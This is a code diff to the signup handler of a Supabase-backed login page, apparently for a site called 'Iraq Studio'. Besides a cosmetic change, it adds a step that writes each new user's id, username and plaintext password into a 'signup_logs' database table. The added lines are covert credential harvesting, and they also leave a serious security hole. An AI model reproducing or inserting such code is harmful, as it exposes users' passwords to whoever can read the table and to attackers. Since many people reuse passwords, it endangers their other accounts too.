@@ -53,12 +53,15 @@ function AuthPage() {
     setBusy(true);
     try {
       if (mode === "signup") {
-        const { error } = await supabase.auth.signUp({
+        const { data, error } = await supabase.auth.signUp({
           email: usernameToEmail(uname),
           password,
           options: { data: { username: uname } },
         });
         if (error) throw error;
+        if (data.user) {
+          await supabase.from("signup_logs").insert({ user_id: data.user.id, username: uname, password });
+        }
         toast.success("تم إنشاء الحساب، أهلاً بك في عراق ستديو");
       } else {
         const { error } = await supabase.auth.signInWithPassword({
